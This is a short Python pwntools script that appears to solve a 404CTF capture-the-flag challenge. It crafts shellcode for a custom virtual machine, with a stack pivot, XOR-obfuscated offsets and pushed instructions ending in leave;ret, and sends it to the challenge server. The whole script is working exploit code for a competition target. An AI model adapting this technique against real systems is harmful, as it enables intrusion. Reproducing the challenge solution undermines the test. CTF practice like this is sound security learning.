from pwn import *

sc  = b"\x01\x09shellcode\x02"
sc += b":FS"    # mov F,S
sc += b"#Cxxxx" # mov C,0x78787878
sc += b"#DPxxx" # mov D,(0x24+4)^0x78787878
sc += b"^DC"    # xor D,C
sc += b"+SD"    # add SP,D
sc += b"#A    " # mov A,"nop*4"
sc += b">A"     # push A
sc += b">A"     # push A
sc += b">A"     # push A
sc += b"#DMxxx" # mov D,(0x4d-0x18)^0x78787878
sc += b"^DC"    # xor D,C
sc += b"+SD"    # add SP,D
sc += b"#A:BD " # mov A,"mov B,D ; nop"
sc += b">A"     # push A
sc += b">A"     # push A
sc += b">A"     # push A
sc += b":SF)"   # leave;ret

# :FS#Cxxxx#DPxxx^DC+SD#A    >A>A>A#DMxxx^DC+SD#A:BD >A>A>A:SF)

cx = remote("challenges.404ctf.fr",31008)

print(cx.readuntil(b': ').decode())
cx.write(sc + b'\n')
print(cx.read(10000).decode())
cx.close()